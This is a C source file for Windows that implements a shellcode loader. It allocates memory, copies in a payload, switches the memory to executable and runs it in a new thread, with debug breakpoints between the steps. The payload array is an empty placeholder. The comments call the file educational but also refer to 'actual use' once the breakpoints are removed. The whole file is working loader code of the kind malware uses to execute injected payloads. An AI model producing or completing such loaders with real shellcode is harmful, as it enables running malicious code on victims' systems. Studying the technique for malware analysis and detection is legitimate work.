// simple shellcode loader in C
// good example of structure to ensure shellcode ends up in .text section of PE file
// uses VirtualAlloc(), RtlMoveMemory(), VirtualProtect(), and CreateThread() as core functions
// implemented custom function error_handler() for error handling + hardcoded breakpoint
// note these are obviously only for educational purposes and should be removed for actual use

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int error_handler(const char *message, int errorCode) {
    printf("%s (Error Code: %d)\n", message, errorCode);
    return errorCode;
}

void forced_breakpoint(const char *message) {
    printf("%s\n", message);
    printf("hit enter to continue!\n");
    getchar();
}

int main(void) {

	// STEP 0: define payload and payload length
	// NOTE here payload is INSIDE OF our main() -> store in .text of PE file
	unsigned char payload[] = { /* payload */ };
	unsigned int payload_length = /* number bytes */;

	// STEP 1: Allocate a memory buffer for payload
	void * payload_mem = VirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (payload_mem == NULL) return error_handler("Failed to allocate memory", GetLastError());
    
	
    int pointer_width = sizeof(void*) * 2;  // Calculate the width required for the pointer in hexadecimal
    printf("%-20s : 0x%0*p\n", "payload is stored at: ", pointer_width, (void *)payload);
    printf("%-20s : 0x%0*p\n", "memory allocated at: ", pointer_width, (void *)payload_mem);


    forced_breakpoint("memory has been allocated");

	// STEP 2: Copy payload to allocated buffer
	RtlMoveMemory(payload_mem, payload, payload_length);
    forced_breakpoint("payload has been copied to buffer.");

	// STEP 3: change memory protection constants to allow execution
	DWORD oldprotect = 0; 
	BOOL change_perm = VirtualProtect(payload_mem, payload_length, PAGE_EXECUTE_READ, &oldprotect);

	if (change_perm == 0) {
		return error_handler("Failed to change memory permissions", GetLastError());
    }

	forced_breakpoint("memory protection constants have been updated.");

	// STEP 4: Execute payload

	HANDLE threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
	if (threadHandle == NULL) {
		return error_handler("Failed to execute payload", GetLastError());
    }

 	// Ensure payload completes 

    DWORD waitResult = WaitForSingleObject(threadHandle, 5000); 

 	CloseHandle(threadHandle);

    VirtualFree(payload_mem, 0, MEM_RELEASE);

	return 0;

}